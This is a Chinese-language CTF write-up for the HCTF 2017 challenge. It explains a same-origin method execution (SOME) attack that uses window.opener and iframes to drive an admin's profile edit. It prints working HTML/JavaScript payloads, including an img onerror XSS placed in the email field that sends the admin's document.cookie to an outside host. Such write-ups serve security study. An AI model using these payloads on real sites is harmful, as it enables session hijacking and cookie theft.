##  writeup 

这是HCTF 2017的一个真题，主要利用some攻击
关于什么是some攻击，出题人已经讲得很清楚了，[在这里](https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/)

**核心思想就是利用弹出的窗口的window.opener去操作同源的父窗口的dom对象**

### 出题人提供一种解法：

在自己的vps上创建一个1.html，内容如下：
```html
<script>
    function start_some() {
        window.open("2.html");
        location.replace("http://localhost:9999/user.php");
        //假设题目监听的是本地的  9999端口
    }
    setTimeout(start_some(), 1000);
</script>
```
然后vps上的2.html内容如下：
```html
<script>
    function attack() {
        location.replace("http://localhost:9999/edit.php?callback=RandomProfile&user=admin");
    }
    setTimeout(attack, 2000);
</script>
```

然后 设置 admin用户的email为:
```html
<img src="\" onerror=window.location.href='http://0xb.pw?cookie='%2bdocument.cookie>
```
然后发给管理员的url为`http://vps/1.html`,当管理员打开此页面的时候,就可以打管理员的cookie了。

但是这种攻击方法只可以对bot起作用，因为非用户交互的弹出窗口都会被浏览器拦截。

### 第二种

只需要一个文件的payload。

```html
<iframe src="http://localhost:9999/user.php" name=b></iframe>
<iframe name=a></iframe>

<script>
window.frames[0].open('http://localhost:9999/edit.php?callback=EditProfile','a');
setTimeout(
  function(){
    window.frames[1].location.href = 'http://localhost:9999/edit.php?callback=RandomProfile&user=admin'
  }
,1000);
</script>
```

首先在b矿建中打开 user.php，在里面window.open一个窗口到框架a中 。 这时候框架a中的页面的父窗口就是框架b中的窗口，然后把admin的信息更新给管理员。

跟前面的相同，设置 admin用户的email为:
```html
<img src="\" onerror=window.location.href='http://0xb.pw?cookie='%2bdocument.cookie>
```
把此页面的url发送给管理员。

其实我感觉payload直接写成这样都可以：

```html
<iframe src="http://localhost:9999/user.php" name=b></iframe>
<iframe name=a></iframe>

<script>
window.frames[0].open('http://localhost:9999/edit.php?callback=RandomProfile&user=admin','a');
</script>
```